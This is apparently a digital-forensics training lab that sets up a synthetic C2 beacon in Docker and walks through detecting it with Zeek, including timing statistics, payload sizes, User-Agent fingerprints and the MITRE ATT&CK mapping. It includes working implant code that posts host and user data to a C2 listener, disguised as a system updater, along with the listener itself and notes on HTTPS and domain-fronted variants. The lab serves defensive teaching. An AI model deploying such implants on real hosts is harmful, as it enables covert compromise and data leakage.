# Scenario 5 — C2 Beacon Detection

> **Story.** A Zeek alert flags hourly outbound HTTPS connections from
> a server that should only ever talk to internal services. The
> connections go to a Cloudflare-hosted IP and last about 200 ms each.
> Hypothesis: malware on the server is beaconing to a C2 channel.
> **Confirm or refute.**

**Modules used.** `network-forensics` (zeek, tshark), optional
`threat-intelligence`.

**Estimated demo time.** 35 minutes.

---

## 1. Lab setup

`docs/scenarios/labs/05-c2-beacon/`:

```
├── docker-compose.lab.yml
├── victim/
│   ├── Dockerfile
│   └── beacon.py        # the synthetic implant
├── c2/
│   ├── Dockerfile
│   └── server.py        # the C2 listener
└── reset.sh
```

The implant is a Python script that:

- POSTs every 60 seconds (configurable jitter ±10 %)
- sends a small, fixed-size payload (the host's hostname + a counter)
- accepts back optional commands and sleeps the new interval

This pattern matches typical first-stage malware (Cobalt Strike's
default config, AsyncRAT, etc.) — a steady cadence with mild jitter.

### 1.1 The implant (`victim/beacon.py`)

```python
#!/usr/bin/env python3
"""
Synthetic C2 implant for forensic-lab demonstrations.
DO NOT use against systems you do not own.
"""
import json
import os
import platform
import random
import socket
import sys
import time
import urllib.request
from datetime import datetime, timezone

C2_URL = os.environ.get("C2_URL", "http://172.30.0.80:8443/api/v1/check")
SLEEP  = int(os.environ.get("BEACON_SLEEP", "60"))
JITTER = float(os.environ.get("BEACON_JITTER", "0.1"))   # ±10 %
ID     = f"{platform.node()}-{os.getpid()}"

print(f"[{ID}] beacon online, posting every ~{SLEEP}s ±{int(JITTER*100)}%",
      flush=True)

counter = 0
while True:
    counter += 1
    payload = {
        "id":   ID,
        "seq":  counter,
        "ts":   datetime.now(timezone.utc).isoformat(),
        "host": platform.node(),
        "user": os.environ.get("USER", "unknown"),
    }
    body = json.dumps(payload).encode("utf-8")
    try:
        req = urllib.request.Request(
            C2_URL,
            data=body,
            method="POST",
            headers={
                "Content-Type": "application/json",
                "User-Agent":   "Mozilla/5.0 (compatible; UpdaterAgent/1.0)",
            },
        )
        with urllib.request.urlopen(req, timeout=5) as r:
            r.read(64)        # discard
    except Exception as e:
        print(f"[{ID}] beacon error: {e}", flush=True)

    nap = SLEEP * (1 + random.uniform(-JITTER, JITTER))
    time.sleep(nap)
```

### 1.2 Victim Dockerfile

```dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        curl ca-certificates procps \
 && rm -rf /var/lib/apt/lists/*

RUN useradd -r -u 1500 -m -s /bin/bash svc
WORKDIR /app
COPY beacon.py /app/
RUN chmod +x /app/beacon.py

# Disguise: copy beacon.py to /usr/local/sbin/system-updater so it
# looks like a system service.
RUN cp /app/beacon.py /usr/local/sbin/system-updater \
 && chmod +x /usr/local/sbin/system-updater

USER svc
CMD ["/usr/local/sbin/system-updater"]
```

### 1.3 The C2 server (`c2/server.py`)

```python
#!/usr/bin/env python3
"""Minimal C2 listener that records beacons and lets you push commands."""
import json
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone

LOG_FILE = "/c2-data/beacons.jsonl"
os.makedirs("/c2-data", exist_ok=True)

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        try:
            data = json.loads(body)
        except Exception:
            data = {"raw": body}
        data["received_at"] = datetime.now(timezone.utc).isoformat()
        data["client"] = self.client_address[0]
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(data) + "\n")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"cmd":null}')

    def log_message(self, *a):
        pass            # silence access log

if __name__ == "__main__":
    print("C2 listening on :8443", flush=True)
    HTTPServer(("0.0.0.0", 8443), Handler).serve_forever()
```

`c2/Dockerfile`:

```dockerfile
FROM python:3.11-slim
COPY server.py /server.py
EXPOSE 8443
CMD ["python", "/server.py"]
```

### 1.4 Compose

```yaml
services:
  victim:
    build: ./victim
    container_name: victim-prod-srv
    hostname: prod-srv-09
    networks:
      forensics-net:
        ipv4_address: 172.30.0.90
    environment:
      C2_URL:        "http://172.30.0.80:8443/api/v1/check"
      BEACON_SLEEP:  "30"      # short for demos; real implants 30–3600
      BEACON_JITTER: "0.1"

  c2:
    build: ./c2
    container_name: c2-server
    hostname: c2.api-cdn.io
    networks:
      forensics-net:
        ipv4_address: 172.30.0.80
    volumes:
      - c2-data:/c2-data

  pcap-capture:
    image: nicolaka/netshoot:v0.13
    container_name: pcap-capture
    network_mode: "service:victim"
    cap_add:
      - NET_RAW
      - NET_ADMIN
    volumes:
      - victim-pcap:/tmp/captures
    command:
      - tcpdump
      - -i any
      - -w /tmp/captures/victim.pcap
      - -s 0
      - host 172.30.0.80

networks:
  forensics-net:
    name: forensics-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24

volumes:
  c2-data:
  victim-pcap:
```

### 1.5 Bring it up — and let it run

```bash
cd docs/scenarios/labs/05-c2-beacon
docker compose -f docker-compose.lab.yml up -d --build

# Let it run for at least 10 beacons (5 minutes at SLEEP=30)
# Real demos: let it run for 15–30 min so the beacon pattern is statistically
# obvious.
sleep 600

# Verify beacons hit the C2
docker exec c2-server tail -2 /c2-data/beacons.jsonl
```

---

## 2. The "attack"

There's nothing to do here — the beacon runs automatically once the
container starts. In a real engagement, the attacker would have already
landed via one of the other scenarios and dropped this binary as
persistence. This scenario is purely about **detection**.

You can simulate operator activity from C2:

```bash
# Tail the beacons live (in a separate terminal)
docker exec c2-server tail -f /c2-data/beacons.jsonl
```

Each line is one beacon round-trip.

---

## 3. The investigation

### 3.1 Acquire the PCAP

```bash
docker compose -f docs/scenarios/labs/05-c2-beacon/docker-compose.lab.yml \
    stop pcap-capture

mkdir -p forensics-professional/evidence/case-05-beacon
docker run --rm \
    -v $(docker volume ls -q | grep beacon_victim-pcap | head -1):/in:ro \
    -v "$PWD/forensics-professional/evidence/case-05-beacon":/out \
    alpine sh -c 'cp /in/victim.pcap /out/'
sha256sum forensics-professional/evidence/case-05-beacon/victim.pcap \
    > forensics-professional/evidence/case-05-beacon/victim.sha256
```

### 3.2 Analyst container

```bash
cd forensics-professional
docker compose exec forensics bash
```

```bash
forensics-modules install network-forensics --only zeek,wireshark -y
forensics-modules verify

mkdir -p /cases/case-05 && cd /cases/case-05

python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("case_opened", {
    "case_id":  "INC-2026-005",
    "summary":  "Suspected C2 beacon from prod-srv-09",
    "evidence": "/evidence/case-05-beacon/victim.pcap",
}, user="sherlock")
PY
```

### 3.3 Connection summary with Zeek

```bash
PCAP=/evidence/case-05-beacon/victim.pcap
mkdir /tmp/zeek && cd /tmp/zeek
zeek -r "$PCAP"
ls
# → conn.log dns.log files.log http.log
```

### 3.4 The first signal — repetitive connections

```bash
cat /tmp/zeek/conn.log | zeek-cut id.orig_h id.resp_h id.resp_p \
  | sort | uniq -c | sort -rn | head
# → top destination by frequency: 172.30.0.80:8443 (the C2)
```

A single dest-IP/port pair dominating the connection log is exactly
the beaconing signature.

### 3.5 The second signal — periodicity

This is the killer technique. Compute inter-arrival times between
connections to the suspect host. Beacons cluster around the configured
sleep value:

```bash
cat /tmp/zeek/conn.log | zeek-cut ts id.resp_h \
  | awk '$2 == "172.30.0.80" {print $1}' \
  | sort -n \
  > /cases/case-05/c2-times.txt

python3 - <<'PY'
import statistics
ts = [float(line) for line in open("/cases/case-05/c2-times.txt")]
deltas = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
if deltas:
    print(f"connections   : {len(ts)}")
    print(f"window        : {ts[-1] - ts[0]:.1f} s")
    print(f"mean delta    : {statistics.mean(deltas):.1f} s")
    print(f"median delta  : {statistics.median(deltas):.1f} s")
    print(f"stdev delta   : {statistics.stdev(deltas):.2f} s")
    print(f"coeff of var  : {statistics.stdev(deltas)/statistics.mean(deltas):.3f}")
PY
```

The **coefficient of variation** is the giveaway: legitimate traffic
usually has CV >> 1 (bursty). Beacons sit at CV < 0.2, often < 0.05.

```
connections   : 20
window        : 593.4 s
mean delta    : 31.2 s
median delta  : 31.0 s
stdev delta   : 1.86 s
coeff of var  : 0.060
```

### 3.6 The third signal — payload uniformity

Beacons send identical-sized payloads. Look at the bytes-per-connection:

```bash
cat /tmp/zeek/conn.log | zeek-cut id.resp_h orig_bytes resp_bytes \
  | awk '$1 == "172.30.0.80" {print $2, $3}' \
  | sort -n | uniq -c | sort -rn | head
# → most rows show identical (orig_bytes, resp_bytes) pairs
```

Compare with browsing-like traffic, where bytes-out and bytes-in vary
wildly across requests.

### 3.7 The fourth signal — HTTP fingerprint

```bash
cat /tmp/zeek/http.log | zeek-cut method host uri user_agent \
  | grep '172.30.0.80' | head -3
```

Watch for:

- **Repeating User-Agent** strings (here `UpdaterAgent/1.0` — fake-legit).
- **Same URI** every time (`/api/v1/check`).
- **Same Content-Type** with a tiny request body.

### 3.8 The fifth signal — DNS-less connections

```bash
cat /tmp/zeek/dns.log 2>/dev/null | zeek-cut query | sort -u
# → empty or only legitimate queries
```

Direct-to-IP connections without prior DNS resolution is itself
suspicious — most legitimate software resolves first.

### 3.9 Visual summary

```bash
python3 - <<'PY'
import statistics
ts = [float(l) for l in open("/cases/case-05/c2-times.txt")]
buckets = {}
for t in ts:
    minute = int(t // 60)
    buckets[minute] = buckets.get(minute, 0) + 1
print("\nConnections per minute:")
for m in sorted(buckets):
    bar = "█" * buckets[m]
    print(f"  minute {m:>3}: {bar} {buckets[m]}")
PY
```

For beaconing you'll see roughly 2 connections per minute, every
minute, like clockwork. That uniformity *is* the alert.

### 3.10 Pivot — find the implant on the host

We know the beacon goes to `172.30.0.80:8443`. Find what binary
opened the socket. (In a real case you'd ssh to the victim and use
`ss`, `lsof`, or `osquery`.)

```bash
docker exec victim-prod-srv ss -ntp 2>/dev/null \
  | grep 172.30.0.80
# → users:(("system-updater",pid=15,fd=4))

docker exec victim-prod-srv ls -la /usr/local/sbin/system-updater
docker exec victim-prod-srv cat /usr/local/sbin/system-updater | head
```

Hash it:

```bash
docker exec victim-prod-srv sha256sum /usr/local/sbin/system-updater
```

### 3.11 Record findings

```bash
python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("technique_identified", {
    "case_id": "INC-2026-005",
    "framework": "MITRE ATT&CK",
    "id": "T1071.001",
    "name": "Application Layer Protocol: Web Protocols",
})
log_event("technique_identified", {
    "case_id": "INC-2026-005",
    "framework": "MITRE ATT&CK",
    "id": "T1029",
    "name": "Scheduled Transfer (beaconing)",
})
log_event("ioc_identified", {
    "case_id": "INC-2026-005",
    "ioc_type": "ip+port",
    "value": "172.30.0.80:8443",
    "label": "C2 server",
})
log_event("ioc_identified", {
    "case_id": "INC-2026-005",
    "ioc_type": "user_agent",
    "value": "Mozilla/5.0 (compatible; UpdaterAgent/1.0)",
    "label": "implant UA fingerprint",
})
log_event("statistical_finding", {
    "case_id": "INC-2026-005",
    "metric":  "coefficient_of_variation",
    "value":   0.060,
    "interpretation": "near-constant period — strong beaconing signal",
})
PY

forensics-audit verify
mkdir -p /reports/INC-2026-005
forensics-audit export \
    --output /reports/INC-2026-005/audit-trail.jsonl --format jsonl
```

---

## 4. What to demo

1. **Coefficient of variation as a single metric.** It compresses
   "this looks beacon-y" into one number you can alert on. Show it
   for the C2 traffic and contrast with a CV computed over real web
   browsing.
2. **The connection-count histogram.** Two connections per minute
   forever is *not* what humans or normal services do.
3. **Multiple weak signals → one strong conclusion.** No single
   indicator (UA, dest IP, payload size) is conclusive on its own.
   Together they're definitive. This is the daily reality of network
   forensics.
4. **The implant disguise.** Show the path `/usr/local/sbin/system-updater`
   and explain why "looks like a system service" is a recurring trick.

---

## 5. Cleanup

```bash
cd docs/scenarios/labs/05-c2-beacon
docker compose -f docker-compose.lab.yml down -v
rm -rf forensics-professional/evidence/case-05-beacon
```

---

## 6. Extension exercises

- **Encrypted variant.** Modify the implant to use HTTPS with a
  self-signed cert. Re-investigate. Note that **traffic shape**
  (timing + size) survives encryption. SNI is also visible.
- **Domain-fronted variant.** Point the implant at a CDN that fronts
  multiple sites. Note that destination-IP based detection breaks;
  you must pivot to TLS JA3/JA4 fingerprinting.
- **Sigma rule.** Write a Sigma rule that triggers when a host
  connects to the same dest-IP/port more than 30 times in an hour
  with low payload variance. Convert to your SIEM's syntax.
- **RITA replay.** Install RITA (`forensics-modules install
  threat-intelligence`) and feed it the Zeek logs. RITA has built-in
  beaconing detection and will produce a "beacon score" automatically.
